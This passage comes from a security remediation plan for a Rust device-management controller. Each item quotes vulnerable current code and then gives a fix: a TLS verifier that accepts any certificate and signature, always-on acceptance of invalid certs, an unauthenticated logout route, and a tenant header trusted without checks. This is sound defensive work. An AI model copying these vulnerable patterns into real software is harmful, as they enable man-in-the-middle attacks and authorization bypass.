- Compile-time: verify `CaSigningKeys` has no `Serialize` impl
- Unit test: `CaMetadata` contains no `key_pem` fields
- Existing cert signing and CRL tests should pass with the split

---

### FP-CR5: Strengthen TOFU with signature verification and fingerprint pinning (TOP 5 — #5)

**Addresses:** CR-5 (Critical — MITM during enrollment)

**Problem:** The `AcceptAnyCert` verifier in `enrollment/src/tls.rs:115-174` unconditionally returns success for `verify_server_cert`, `verify_tls12_signature`, AND `verify_tls13_signature`. This doesn't just skip certificate chain validation — it also bypasses handshake signature verification, meaning an attacker doesn't even need a valid private key to impersonate the server. During `--tofu` enrollment, a MITM can inject a rogue CA certificate, compromising all subsequent mTLS connections.

Additionally, the CLI client (`crates/ui/cli/src/client.rs:13`) has a hardcoded `tls_danger_accept_invalid_certs(true)` that is always active — not just for TOFU.

**Current `AcceptAnyCert` code:**
```rust
impl ServerCertVerifier for AcceptAnyCert {
    fn verify_server_cert(...) -> Result<ServerCertVerified, Error> {
        Ok(ServerCertVerified::assertion())  // accepts ANY cert
    }
    fn verify_tls12_signature(...) -> Result<HandshakeSignatureValid, Error> {
        Ok(HandshakeSignatureValid::assertion())  // accepts ANY signature
    }
    fn verify_tls13_signature(...) -> Result<HandshakeSignatureValid, Error> {
        Ok(HandshakeSignatureValid::assertion())  // accepts ANY signature
    }
}
```

**Detailed implementation plan:**

1. **Replace `AcceptAnyCert` with `TofuVerifier`** that validates signatures but not chain:
   ```rust
   #[derive(Debug)]
   struct TofuVerifier;

   impl ServerCertVerifier for TofuVerifier {
       fn verify_server_cert(
           &self, end_entity: &CertificateDer<'_>, _intermediates: &[CertificateDer<'_>],
           _server_name: &ServerName<'_>, _ocsp: &[u8], _now: UnixTime,
       ) -> Result<ServerCertVerified, Error> {
           // Accept any certificate (we don't know the CA yet)
           // BUT we DO verify the TLS handshake signatures below
           Ok(ServerCertVerified::assertion())
       }

       fn verify_tls12_signature(&self, message: &[u8], cert: &CertificateDer<'_>, dss: &DigitallySignedStruct) -> Result<HandshakeSignatureValid, Error> {
           // Delegate to the default WebPKI verifier for signature math
           rustls::crypto::ring::default_provider()
               .verify_tls12_signature(message, cert, dss)
       }

       fn verify_tls13_signature(&self, message: &[u8], cert: &CertificateDer<'_>, dss: &DigitallySignedStruct) -> Result<HandshakeSignatureValid, Error> {
           rustls::crypto::ring::default_provider()
               .verify_tls13_signature(message, cert, dss)
       }
   }
   ```
   This ensures the server actually holds the private key for the certificate it presents, preventing passive MITM.

2. **Add CA certificate fingerprint logging and verification:**
   After fetching the CA cert via TOFU, compute and display its SHA-256 fingerprint:
   ```rust
   let fingerprint = sha256_fingerprint(&ca_pem);
   tracing::warn!(
       "TOFU: accepted CA certificate with fingerprint SHA256:{}",
       fingerprint
   );
   tracing::warn!(
       "TOFU: verify this fingerprint matches your controller's CA"
   );
   ```

3. **Add `--tofu-fingerprint <SHA256:hex>` optional flag:**
   ```rust
   #[arg(long, requires = "tofu")]
   pub tofu_fingerprint: Option<String>,
   ```
   When provided, after fetching the CA cert, verify the fingerprint matches. If it doesn't, abort enrollment with an error. This provides SSH-like `known_hosts` behavior.

4. **Fix the CLI client** (`crates/ui/cli/src/client.rs`):
   - Remove the hardcoded `tls_danger_accept_invalid_certs(true)`
   - Add a `--insecure` flag (off by default) to opt in to insecure TLS
   - When no `--insecure` flag, use system trust store or a configured CA cert

5. **Add a deprecation path for `--tofu` without fingerprint:**
   - Log a prominent warning when `--tofu` is used without `--tofu-fingerprint`
   - Document that `--tofu-fingerprint` is the recommended approach

**Files to modify:**
- `crates/shared/enrollment/src/tls.rs` — replace `AcceptAnyCert` with `TofuVerifier`
- `crates/shared/enrollment/src/ca.rs` — add fingerprint display and verification
- `crates/shared/enrollment/src/cli.rs` — add `--tofu-fingerprint` arg
- `crates/ui/cli/src/client.rs` — remove hardcoded insecure TLS, add `--insecure` flag
- `crates/core/agent/src/main.rs` — pass `tofu_fingerprint` to `bootstrap_ca`

**Testing:**
- Unit test: `TofuVerifier` rejects invalid signatures
- Unit test: `TofuVerifier` accepts valid self-signed cert with correct signature
- Unit test: fingerprint mismatch aborts enrollment
- Integration test: TOFU enrollment succeeds with correct fingerprint

---

### FP-CR6: Require auth on logout (TOP 5 — #6)

**Addresses:** CR-6 (Critical — authorization bypass on session revocation)

**Problem:** The `logout` route is registered alongside `register`, `login`, and `refresh` in the public (unauthenticated) router group in `web-api/src/lib.rs:437`. It is NOT inside the `auth_routes` group that has `require_auth` middleware. Any unauthenticated caller can revoke any valid refresh token by providing its value.

**Current router setup (`web-api/src/lib.rs:434-448`):**
```rust
let (api_router, api) = OpenApiRouter::with_openapi(ApiDoc::openapi())
    .routes(routes!(routes::auth::register))
    .routes(routes!(routes::auth::login))
    .routes(routes!(routes::auth::logout))      // ← PUBLIC — no auth!
    .routes(routes!(routes::auth::refresh))
    .merge(auth_routes)                          // ← auth_routes has require_auth
    .split_for_parts();
```

**Current logout handler (`web-api/src/routes/auth.rs:307-321`):**
```rust
pub async fn logout(
    State(state): State<Arc<AppState>>,
    Json(req): Json<LogoutRequest>,
) -> Response {
    let session_service = SessionService::new(state.db.clone());
    if let Err(e) = session_service
        .revoke_refresh_token(&req.refresh_token)
        .await
    {
        tracing::error!("Failed to revoke refresh token: {:?}", e);
    }
    StatusCode::NO_CONTENT.into_response()
}
```

**Issues:**
1. No `AuthenticatedUser` extraction — handler doesn't know who is calling
2. Accepts any refresh token from request body with no ownership verification
3. Returns 204 even on failure — silent error swallowing
4. An attacker with a leaked token can revoke it to deny service to the legitimate user

**Detailed implementation plan:**

1. **Move the `logout` route into the `auth_routes` group** (`web-api/src/lib.rs`):
   ```rust
   let auth_routes = OpenApiRouter::new()
       .routes(routes!(routes::auth::logout))   // ← Move here
       .routes(routes!(routes::auth::me))
       // ... other authenticated routes ...
       .route_layer(axum_mw::from_fn_with_state(
           Arc::clone(&state),
           middleware::require_auth::require_auth,
       ));
   ```

2. **Update the handler to require authentication and validate ownership:**
   ```rust
   pub async fn logout(
       State(state): State<Arc<AppState>>,
       Extension(user): Extension<AuthenticatedUser>,
       Json(req): Json<LogoutRequest>,
   ) -> Response {
       let session_service = SessionService::new(state.db.clone());

       // Verify the refresh token belongs to the authenticated user
       match session_service.verify_refresh_token(&req.refresh_token).await {
           Ok(verified) if verified.user_id == user.user_id => {
               if let Err(e) = session_service
                   .revoke_refresh_token(&req.refresh_token)
                   .await
               {
                   tracing::error!(user_id = %user.user_id, "Failed to revoke refresh token: {e:?}");
                   return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Failed to logout");
               }
           }
           Ok(_) => {
               // Token belongs to a different user
               return error_response(StatusCode::FORBIDDEN, "Token does not belong to this user");
           }
           Err(_) => {
               // Token is invalid/expired/already revoked — still return success
               // (idempotent logout)
           }
       }

       StatusCode::NO_CONTENT.into_response()
   }
   ```

3. **Update OpenAPI spec** to reflect that logout now requires `Authorization: Bearer` header.

4. **Frontend update:** Ensure the logout call sends the access token in the `Authorization` header alongside the refresh token in the body.

**Files to modify:**
- `crates/ui/web-api/src/lib.rs` — move route registration
- `crates/ui/web-api/src/routes/auth.rs` — add `Extension(user)`, validate ownership

**Testing:**
- Unit test: unauthenticated logout returns 401
- Unit test: logout with someone else's token returns 403
- Unit test: logout with own valid token returns 204 and revokes session
- Unit test: logout with already-revoked token returns 204 (idempotent)

---

### FP-CR4: Restrict tenant context header (TOP 5 — #7)

**Addresses:** CR-4 (Critical — tenant isolation bypass, latent until multi-tenancy)

**Problem:** The `TenantContext` Axum extractor (`web-api/src/middleware/tenant_context.rs:29-51`) reads the `X-Tenant-Id` header from any request and uses it directly as the tenant ID — with NO authorization check. Any client (authenticated or not) can set this header to any UUID. All 40+ route handlers across 7 route modules use `TenantContext` to scope database queries.

**Current extractor:**
```rust
impl FromRequestParts<Arc<AppState>> for TenantContext {
    async fn from_request_parts(parts: &mut Parts, state: &Arc<AppState>) -> Result<Self, Self::Rejection> {
        if let Some(header_val) = parts.headers.get("x-tenant-id") {
            let tenant_id = header_val.to_str()?.parse::<Uuid>()?;
            return Ok(TenantContext { tenant_id });    // ← No auth check!
        }
        Ok(TenantContext { tenant_id: state.default_tenant_id })
    }
}
```

**Current risk:** In single-tenant mode, the risk is limited because there's only one tenant with data. But if multi-tenancy is ever activated, this becomes a complete tenant isolation bypass — any user can read/modify any tenant's data by setting the header.

**An additional concern:** `require_auth` middleware always fetches permissions for `state.default_tenant_id` (hardcoded), not for the tenant in the request. This means even if a user has no permissions in tenant B, they'd still pass the permission check because permissions are loaded for the default tenant.

**Detailed implementation plan:**

1. **Immediate fix (single-tenant mode):** Ignore the `X-Tenant-Id` header entirely:
   ```rust
   impl FromRequestParts<Arc<AppState>> for TenantContext {
       async fn from_request_parts(
           parts: &mut Parts,
           state: &Arc<AppState>,
       ) -> Result<Self, Self::Rejection> {
           // In single-tenant mode, always use the default tenant.
           // Log if someone sends the header (could indicate misconfiguration or probing).
           if parts.headers.get("x-tenant-id").is_some() {
               tracing::warn!(
                   "X-Tenant-Id header ignored in single-tenant mode"
               );
           }
           Ok(TenantContext {
               tenant_id: state.default_tenant_id,
           })
       }
   }
   ```

2. **Future multi-tenant preparation (design only, not implemented now):**
   - `require_auth` middleware must resolve the tenant from the request (header or path) and fetch the user's roles/permissions for **that** tenant
   - `AuthenticatedUser` should include a `tenant_ids: Vec<Uuid>` field listing authorized tenants
   - `TenantContext` extractor should verify `tenant_id ∈ auth_user.tenant_ids`
   - Unauthenticated endpoints (login, register) always use the default tenant

3. **Add a `multi_tenant` feature flag** to the `web-api` crate. The header-based tenant switching code should only compile when the flag is active. This prevents accidental re-introduction.

**Files to modify:**
- `crates/ui/web-api/src/middleware/tenant_context.rs` — ignore header, log warning

**Testing:**
- Unit test: request with `X-Tenant-Id` header returns data from `default_tenant_id` (not the header value)
- Unit test: warning is logged when header is present

---

### FP-HI2: Wrap service merge in transaction (TOP 5 — #8)

**Addresses:** HI-2 (High — irrecoverable data corruption on partial failure)

**Problem:** The `merge_service` handler in `web-api/src/routes/services.rs:455-635` performs 9+ sequential database operations without a transaction. A failure partway through leaves the system in an inconsistent state: the source service may be deactivated and its certificates revoked, but the target service was never updated with the source's data, and host links were never copied.

**Current operation sequence (all separate auto-committed writes):**
```
1. SELECT target service
2. SELECT source service
3. UPDATE source service → deactivate, invalidate enrollment hash     ← FIRST WRITE
4. UPDATE service_certificates → revoke source certs                  ← errors only logged
5. UPDATE service_certificates → revoke target certs                  ← errors only logged
6. UPDATE settings_version → bump revocation counter                  ← errors only logged
7. UPDATE target service → copy hostname, IP, enrollment secret       ← returns 500 on error
8. SELECT source host links
9. For each link: SELECT + INSERT → copy to target                    ← errors only logged
```

**Failure scenario (e.g., failure at step 7):**
- Source is deactivated (step 3) — cannot reconnect
- Source + target certificates revoked (steps 4-5) — agents lose mTLS
- Target not updated (step 7 failed) — lost enrollment secret, hostname, IP
- Host links not copied (step 9 never ran) — host associations lost
- **Result:** Both services are broken with no automatic recovery path

**Detailed implementation plan:**

1. **Wrap all operations in a single transaction:**
   ```rust
   pub async fn merge_service(
       State(state): State<Arc<AppState>>,
       tenant: TenantContext,
       Extension(user): Extension<AuthenticatedUser>,
       Path(target_id): Path<String>,
       Json(body): Json<MergeAgentRequest>,
   ) -> Response {
       // ... validation, UUID parsing ...

       let txn = match state.db.begin().await {
           Ok(txn) => txn,
           Err(e) => {
               tracing::error!("Failed to begin transaction: {e}");
               return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
           }
       };

       // All DB operations use &txn instead of &state.db
       let target = Service::find_by_id(target_uuid)
           .filter(service::Column::TenantId.eq(tenant.tenant_id))
           .filter(service::Column::DeactivatedAt.is_null())
           .one(&txn).await;
       // ... etc ...

       // On any error, txn is dropped → automatic rollback
       // Only commit at the very end:
       if let Err(e) = txn.commit().await {
           tracing::error!("Failed to commit merge transaction: {e}");
           return error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error");
       }

       // Post-commit side effects (notifications, cache invalidation)
       state.revocation_notify.notify_one();

       // Return success response
   }
   ```

2. **Convert all error-swallowing log-and-continue patterns to early returns:**
   Currently, certificate revocation errors (steps 4-5) and host link copy errors (step 9) are only logged. Inside a transaction, these should propagate errors so the entire operation rolls back:
   ```rust
   // Before (broken):
   if let Err(e) = ServiceCertificate::update_many()...exec(&state.db).await {
       tracing::error!("Failed to revoke certificates: {e}");
       // continues anyway!
   }

   // After (correct):
   ServiceCertificate::update_many()...exec(&txn).await
       .map_err(|e| {
           tracing::error!("Failed to revoke certificates during merge: {e}");
           error_response(StatusCode::INTERNAL_SERVER_ERROR, "Internal server error")
       })?;
   ```

3. **Move side effects after commit:** The `revocation_notify.notify_one()` and any other notifications must happen AFTER `txn.commit()` succeeds, not inside the transaction. If they trigger before commit, other components may read stale data.

4. **Add a `SELECT FOR UPDATE` on both source and target** to prevent concurrent merge operations on the same services:
   ```rust
   // SeaORM doesn't have native SELECT FOR UPDATE, use raw query or lock_exclusive()
   let target = Service::find_by_id(target_uuid)
       .lock_exclusive()  // SELECT ... FOR UPDATE
       .one(&txn).await;
   ```

**Files to modify:**
- `crates/ui/web-api/src/routes/services.rs` — wrap in transaction, propagate errors, move side effects

**Testing:**
- Unit test: successful merge commits all changes atomically
- Unit test: failure at any step rolls back everything (source still active, certs not revoked)
- Unit test: concurrent merges on the same service don't corrupt data

---

### FP-HI4: Cap certificate lifetime (TOP 5 — #9)

**Addresses:** HI-4 (High — unlimited certificate validity)

**Problem:** `sign_agent_csr()` in `controller/src/cert_signer.rs` accepts an arbitrary `time::Duration` for certificate lifetime with no upper bound. The lifetime originates from the `agent_cert_lifetime_days` setting, which is a `u16` validated only as `>= 1` — allowing up to 65,535 days (179 years). No validation exists at any layer in the chain.

**Current flow:**
```
Admin API → settings.set_agent_cert_lifetime_days(days: u16)    // only validates >= 1
           ↓
Agent WS  → do_sign_csr() → Duration::days(settings.agent_cert_lifetime_days())
           ↓
Signer    → sign_agent_csr(lifetime) → not_after = now() + lifetime    // NO CAP
```

**Current code (`cert_signer.rs:49-95`):**
```rust
fn sign_agent_csr(
    csr_pem: &str,
    issuer: &Issuer<'_, KeyPair>,
    agent_id: &Uuid,
    lifetime: time::Duration,        // ← accepts anything
    pki_addr: Option<&str>,
) -> Result<SignedCertBundle, Report<CertSignerError>> {
    // ...
    let not_after = OffsetDateTime::now_utc() + lifetime;  // ← no cap
    // ...
}
```

**Security impact:** An admin (or compromised admin account) can set `lifetime_days = 65535`, producing certificates valid until ~2205. Such certificates:
- Cannot be practically rotated (no expiry pressure)
- Increase the blast radius of key compromise
- Make CRL the sole revocation mechanism (CRLs have their own gaps — see ME-12)
- Violate CA/Browser Forum and industry best practices

**Detailed implementation plan:**

1. **Add a constant and clamp in the cert signer (defense in depth):**
   ```rust
   /// Maximum certificate lifetime: 2 years (730 days).
   /// Aligns with industry best practices and ensures regular key rotation.
   const MAX_CERT_LIFETIME: time::Duration = time::Duration::days(730);

   fn sign_agent_csr(
       csr_pem: &str,
       issuer: &Issuer<'_, KeyPair>,
       agent_id: &Uuid,
       lifetime: time::Duration,
       pki_addr: Option<&str>,
   ) -> Result<SignedCertBundle, Report<CertSignerError>> {
       let capped = lifetime.min(MAX_CERT_LIFETIME);
       if lifetime > MAX_CERT_LIFETIME {
           tracing::warn!(
               agent_id = %agent_id,
               requested_days = lifetime.whole_days(),
               capped_days = MAX_CERT_LIFETIME.whole_days(),
               "Certificate lifetime capped to maximum allowed value"
           );
       }
       // ...
       let not_after = OffsetDateTime::now_utc() + capped;
       // ...
   }
   ```

2. **Also cap `not_after` to the CA's own `not_after`:**
   A certificate should never outlive its issuing CA. Add:
   ```rust
   // Ensure cert doesn't outlive the CA
   let ca_not_after = /* from snapshot */;
   let not_after = not_after.min(ca_not_after);
   ```

3. **Add validation at the settings API layer:**
   In `web-api/src/routes/settings_agent_certs.rs`, add a maximum check:
   ```rust
   if let Some(days) = req.lifetime_days {
       if days < 1 {
           return error_response(StatusCode::BAD_REQUEST, "Certificate lifetime must be at least 1 day");
       }
       if days > 730 {
           return error_response(StatusCode::BAD_REQUEST, "Certificate lifetime must not exceed 730 days");
       }
       // ...
   }
   ```

4. **Update the MQTT service certificate path** (`web-api/src/routes/mqtt_ws.rs:627-651`) — same `do_sign_mqtt_service_csr` flow uses the same setting, so the signer-level cap protects both paths.

**Files to modify:**
- `crates/core/controller/src/cert_signer.rs` — add `MAX_CERT_LIFETIME` constant, clamp + warn
- `crates/ui/web-api/src/routes/settings_agent_certs.rs` — add maximum validation
- `crates/shared/web-api-types/src/settings_agent_certs.rs` — document the maximum in field docs

**Testing:**
- Unit test: lifetime > 730 days is capped to 730
- Unit test: lifetime <= 730 days passes through unchanged
- Unit test: settings API rejects `lifetime_days > 730` with 400
- Unit test: cert `not_after` never exceeds CA `not_after`

---

### FP-ME1: Implement refresh token rotation (TOP 5 — #10)

**Addresses:** ME-1 (Medium — stolen refresh tokens remain usable for 7 days)

**Problem:** When a refresh token is used at `POST /api/v1/auth/refresh`, the server verifies it and issues a new access token (JWT), but the refresh token itself is NOT rotated — the same token remains valid for its full 7-day lifetime. If stolen (via XSS, log exposure, or device theft), an attacker can silently maintain access for 7 days with no detection mechanism.

**Current refresh flow (`web-api/src/routes/auth.rs:382-443`):**
```rust
pub async fn refresh(State(state): State<Arc<AppState>>, Json(req): Json<RefreshRequest>) -> Response {
    let session_service = SessionService::new(state.db.clone());
    let verified = session_service.verify_refresh_token(&req.refresh_token).await?;
    // ... check user active, get permissions ...
    let access_token = state.jwt.create_access_token(user.id, &permissions, ...)?;
    // Returns ONLY new access token — refresh token unchanged
    Json(RefreshResponse { access_token, expires_in, token_type })
}
```

**Current `verify_refresh_token` (`web-api/src/auth/session.rs:62-92`):**
```rust
pub async fn verify_refresh_token(&self, token: &str) -> Result<VerifiedSession> {
    let hash = token::hash_token(token);
    let session = Session::find()
        .filter(session::Column::RefreshTokenHash.eq(&hash))
        .one(&self.db).await?
        .ok_or(AuthError::InvalidRefreshToken)?;
    if session.revoked_at.is_some() { return Err(AuthError::RefreshTokenRevoked); }
    if session.expires_at <= OffsetDateTime::now_utc() { return Err(AuthError::RefreshTokenExpired); }
    Ok(VerifiedSession { user_id: session.user_id, auth_method: ... })
}
```

**Security impact:** With no rotation, there is no way to detect token theft. Both the attacker and the legitimate user can independently refresh using the same token. Compare with rotation: if the attacker refreshes first, the old token is revoked, and the legitimate user's next refresh attempt fails — immediately signaling a breach.

**Detailed implementation plan:**

1. **Add `rotate_refresh_token()` method to `SessionService`:**
   ```rust
   /// Atomically rotate a refresh token: verify old → revoke old → create new.
   /// Returns the verified session info and the new plaintext refresh token.
   pub async fn rotate_refresh_token(
       &self,
       old_token: &str,
       user_agent: Option<String>,
       ip_address: Option<String>,
   ) -> Result<(VerifiedSession, String)> {
       let verified = self.verify_refresh_token(old_token).await?;

       // Revoke the old token
       self.revoke_refresh_token(old_token).await?;

       // Create a new session with a fresh token
       let new_token = self.create_refresh_token(
           verified.user_id,
           verified.auth_method.clone(),
           user_agent,
           ip_address,
       ).await?;

       Ok((verified, new_token))
   }
   ```

2. **Add replay detection — revoke all sessions on reuse of revoked token:**
   ```rust
   pub async fn verify_refresh_token(&self, token: &str) -> Result<VerifiedSession> {
       let hash = token::hash_token(token);
       let session = Session::find()
           .filter(session::Column::RefreshTokenHash.eq(&hash))
           .one(&self.db).await?
           .ok_or(AuthError::InvalidRefreshToken)?;

       if session.revoked_at.is_some() {
           // REPLAY DETECTED: a revoked token was reused.
           // This means the old token was stolen before rotation.
           // Revoke ALL sessions for this user as a safety measure.
           tracing::warn!(
               user_id = %session.user_id,
               "Revoked refresh token reused — revoking all sessions (possible token theft)"
           );
           self.revoke_all_user_sessions(session.user_id).await?;
           return Err(report!(AuthError::RefreshTokenRevoked));
       }

       if session.expires_at <= OffsetDateTime::now_utc() {
           return Err(report!(AuthError::RefreshTokenExpired));
       }
       Ok(VerifiedSession { user_id: session.user_id, auth_method: ... })
   }

   /// Revoke all active sessions for a user (nuclear option on token theft).
   async fn revoke_all_user_sessions(&self, user_id: Uuid) -> Result<()> {
       let now = OffsetDateTime::now_utc();
       Session::update_many()
           .col_expr(session::Column::RevokedAt, Expr::value(Some(now)))
           .filter(session::Column::UserId.eq(user_id))
           .filter(session::Column::RevokedAt.is_null())
           .exec(&self.db)
           .await
           .context_to()?;
       Ok(())
   }
   ```

3. **Update the refresh endpoint to return the new token:**
   ```rust
   pub async fn refresh(
       State(state): State<Arc<AppState>>,
       Json(req): Json<RefreshRequest>,
   ) -> Response {
       let session_service = SessionService::new(state.db.clone());
       let (verified, new_refresh_token) = match session_service
           .rotate_refresh_token(&req.refresh_token, None, None)
           .await
       {
           Ok(v) => v,
           Err(_) => return error_response(StatusCode::UNAUTHORIZED, "Invalid or expired refresh token"),
       };

       // ... check user active, get permissions, create JWT ...

       Json(RefreshResponse {
           access_token,
           refresh_token: new_refresh_token,    // NEW FIELD
           expires_in: state.jwt.expires_in(),
           token_type: "Bearer".to_string(),
       }).into_response()
   }
   ```

4. **Update `RefreshResponse` type:**
   ```rust
   pub struct RefreshResponse {
       pub access_token: String,
       pub refresh_token: String,    // ← ADD
       pub expires_in: u64,
       pub token_type: String,
   }
   ```

5. **Frontend update:** The SvelteKit auth store must persist the new `refresh_token` from each refresh response, replacing the old one. This is a one-line change in the token refresh handler.

**Files to modify:**
- `crates/ui/web-api/src/auth/session.rs` — add `rotate_refresh_token()`, `revoke_all_user_sessions()`, replay detection in `verify_refresh_token()`
- `crates/ui/web-api/src/routes/auth.rs` — call `rotate_refresh_token()`, return new token
- `crates/shared/web-api-types/src/auth.rs` — add `refresh_token` field to `RefreshResponse`
- `frontend/src/lib/` — update auth store to persist new refresh token

**Testing:**
- Unit test: rotation creates new token and revokes old one
- Unit test: old token is invalid after rotation
- Unit test: new token works after rotation
- Unit test: reuse of revoked token triggers revocation of ALL user sessions
- Unit test: concurrent rotation attempts — second attempt sees revoked token → triggers nuclear revoke
- Integration test: full login → refresh (with rotation) → refresh (with new token) cycle

---

### FP-HI8: Fix FK cascade inconsistencies (TOP 5 — #11)

**Addresses:** HI-8 (High — FK missing ON DELETE), HI-9 (High — missing FK entirely)

**Problem:** The `service_certificates` table has two foreign key issues:
1. **HI-8:** The FK `service_certificates.service_id → services.id` has NO `on_delete` clause (defaults to `RESTRICT` in most databases). This is inconsistent with `service_hosts` (which uses `CASCADE`). Deleting a service cascades host links but is blocked by certificates — creating a half-deleted state.
2. **HI-9:** The `service_certificates.ca_fingerprint` column references `ca_certificates.fingerprint` but has NO foreign key constraint at all. Migration 008 (which creates `service_certificates`) runs before migration 025 (which creates `ca_certificates`), so the FK couldn't be defined at creation time — and no subsequent migration adds it.

**Current migration 008 FK definition:**
```rust
.foreign_key(
    ForeignKey::create()
        .name("fk_service_certificates_service_id")
        .from(ServiceCertificates::Table, ServiceCertificates::ServiceId)
        .to(Services::Table, Services::Id),
        // ❌ MISSING: .on_delete(ForeignKeyAction::...)
)
// ❌ MISSING: FK from ca_fingerprint → ca_certificates.fingerprint
```

**Comparison — correctly defined FKs in `service_hosts` (migration 013):**
```rust
.foreign_key(
    ForeignKey::create()
        .name("fk_service_hosts_service")
        .from(ServiceHosts::Table, ServiceHosts::ServiceId)
        .to(Services::Table, Services::Id)
        .on_delete(ForeignKeyAction::Cascade), // ✅ explicit
)
```

**Detailed implementation plan:**

1. **Modify migration 008** to add explicit `on_delete` to the `service_id` FK. Since this project allows modifying existing migrations (per AGENTS.md), update the FK in-place:
   ```rust
   .foreign_key(
       ForeignKey::create()
           .name("fk_service_certificates_service_id")
           .from(ServiceCertificates::Table, ServiceCertificates::ServiceId)
           .to(Services::Table, Services::Id)
           .on_delete(ForeignKeyAction::Cascade),  // ← ADD
   )
   ```
   **Rationale for CASCADE:** When a service is deleted (soft-delete via `deactivated_at`), its certificates should also be marked as revoked. Since the codebase uses soft-delete, actual row deletion only happens in edge cases — but the FK behavior should be consistent with `service_hosts` which uses CASCADE.

2. **Add FK from `ca_fingerprint` to `ca_certificates`** in migration 008. Since migration 025 creates `ca_certificates` after migration 008, either:
   - **Option A (preferred):** Add the FK in migration 025's `up()` method after creating the `ca_certificates` table:
     ```rust
     // After creating ca_certificates table, add the FK from service_certificates
     manager.create_foreign_key(
         ForeignKey::create()
             .name("fk_service_certificates_ca_fingerprint")
             .from(ServiceCertificates::Table, ServiceCertificates::CaFingerprint)
             .to(CaCertificates::Table, CaCertificates::Fingerprint)
             .on_delete(ForeignKeyAction::Restrict)  // CA must not be deleted while certs reference it
             .to_owned(),
     ).await?;
     ```
   - **Option B:** Create a new migration specifically for this FK.

3. **Audit all other FKs for consistency.** Based on the exploration, the current state is:
   - Tenant FKs: all `Restrict` (correct — prevents orphaned data)
   - Junction table FKs: all `Cascade` (correct — cleanup on parent delete)
   - `service_certificates.service_id`: `Restrict` by default ← **FIX to explicit CASCADE**
   - `service_certificates.ca_fingerprint`: missing FK entirely ← **FIX to add with RESTRICT**

**Files to modify:**
- `crates/core/controller/src/migration/m20260129_000008_create_agent_certificates.rs` — add `on_delete(Cascade)` to service_id FK
- `crates/core/controller/src/migration/m20260207_000025_create_ca_certificates.rs` — add FK from `service_certificates.ca_fingerprint`

**Testing:**
- Verify migration runs clean on fresh database
- Verify deleting a service cascades to its certificates
- Verify deleting a CA certificate with active service_certificates is blocked (RESTRICT)

---

### FP-HI10: Add tenant filter to host agents (TOP 5 — #12)

**Addresses:** HI-10 (High — cross-tenant data leak)

**Problem:** The `load_host_agents()` helper in `web-api/src/routes/hosts.rs:301-339` queries agents by `host_id` via the `service_hosts` junction table without any tenant filtering. If a `service_hosts` link points to an agent in a different tenant (through data corruption or future multi-tenancy), that agent's information leaks into the response.

**Current code (`hosts.rs:301-339`):**
```rust
async fn load_host_agents(
    db: &sea_orm::DatabaseConnection,
    host_id: uuid::Uuid,
) -> Vec<HostAgentSummary> {
    let links = AgentHost::find()
        .filter(agent_host::Column::HostId.eq(host_id))
        .all(db).await?;

    for link in links {
        if let Ok(Some(a)) = Agent::find_by_id(link.service_id)
            .filter(agent::Column::DeactivatedAt.is_null())
            // ❌ MISSING: .filter(agent::Column::TenantId.eq(tenant_id))
            .one(db).await
        { /* build summary */ }
    }
}
```

**Additionally, this has an N+1 query pattern** (also flagged as ME-7): one query to get links, then one query per agent. This can be fixed simultaneously.

**Detailed implementation plan:**

1. **Add `tenant_id` parameter and use a single JOIN query:**
   ```rust
   async fn load_host_agents(
       db: &sea_orm::DatabaseConnection,
       host_id: uuid::Uuid,
       tenant_id: uuid::Uuid,
   ) -> Vec<HostAgentSummary> {
       // Single query with join — fixes both N+1 (ME-7 partially) and tenant scoping (HI-10)
       let agents = match Service::find()
           .inner_join(ServiceHost)
           .filter(service_host::Column::HostId.eq(host_id))
           .filter(service::Column::TenantId.eq(tenant_id))
           .filter(service::Column::DeactivatedAt.is_null())
           .all(db)
           .await
       {
           Ok(agents) => agents,
           Err(e) => {
               tracing::warn!("Failed to load host agents: {e}");
               return Vec::new();
           }
       };

       agents.into_iter().map(|a| HostAgentSummary {
           id: a.id.to_string(),
           friendly_name: a.friendly_name,
           status: a.status.into(),
       }).collect()
   }
   ```

2. **Update all 3 call sites** to pass `tenant.tenant_id`:
   - `list_hosts` (line 89): `load_host_agents(&state.db, h.id, tenant.tenant_id).await`
   - `get_host` (line 145): `load_host_agents(&state.db, host_id, tenant.tenant_id).await`
   - `update_host` (line 210): `load_host_agents(&state.db, host_id, tenant.tenant_id).await`

**Files to modify:**
- `crates/ui/web-api/src/routes/hosts.rs` — rewrite `load_host_agents()`, update call sites

**Testing:**
- Unit test: agents from different tenants are not returned
- Unit test: deactivated agents are not returned
- Verify existing host listing behavior is unchanged for single-tenant

---

### FP-HI11: Add rate limiting to device approval endpoint (TOP 5 — #13)

**Addresses:** HI-11 (High — brute-force risk), ME-5 (Medium — device flow approval lacks rate limiting)

**Problem:** The `/api/v1/auth/device/approve` endpoint is NOT in the `RATE_LIMITS` HashMap and has no rate limiting. Device flow user codes are short (typically 8 characters) and can be brute-forced. Any authenticated user can approve device flows regardless of permissions.

**Note:** The original HI-11 finding mentions the refresh endpoint, which has since been added to `RATE_LIMITS` at 10 req/min. The remaining gap is `/api/v1/auth/device/approve`.

**Current `RATE_LIMITS` configuration (`middleware/rate_limit.rs:20-58`):**
```rust
static RATE_LIMITS: LazyLock<HashMap<&'static str, EndpointRateLimit>> = LazyLock::new(|| {
    HashMap::from([
        ("/api/v1/auth/login",        EndpointRateLimit { max_requests: 10, window_secs: 60 }),
        ("/api/v1/auth/register",     EndpointRateLimit { max_requests: 10, window_secs: 60 }),
        ("/api/v1/auth/refresh",      EndpointRateLimit { max_requests: 10, window_secs: 60 }),
        ("/api/v1/auth/device",       EndpointRateLimit { max_requests: 10, window_secs: 60 }),
        ("/api/v1/auth/device/poll",  EndpointRateLimit { max_requests: 12, window_secs: 60 }),
        // ❌ MISSING: /api/v1/auth/device/approve
    ])
});
```

**Detailed implementation plan:**

1. **Add `/api/v1/auth/device/approve` to `RATE_LIMITS`:**
   ```rust
   (
       "/api/v1/auth/device/approve",
       EndpointRateLimit {
           max_requests: 5,    // Strict — approval is infrequent
           window_secs: 60,
       },
   ),
   ```

2. **Add permission check to the approval handler** (addresses ME-5):
   The approval endpoint should require a specific permission (e.g., `ManageAgents` or a new `ApproveDeviceFlow` permission) rather than allowing any authenticated user to approve. This is a defense-in-depth measure beyond rate limiting.

3. **Update tests:** Add `/api/v1/auth/device/approve` to the `rate_limited_paths_list` test and remove it from `non_rate_limited_paths` if present.

**Files to modify:**
- `crates/ui/web-api/src/middleware/rate_limit.rs` — add endpoint to `RATE_LIMITS`
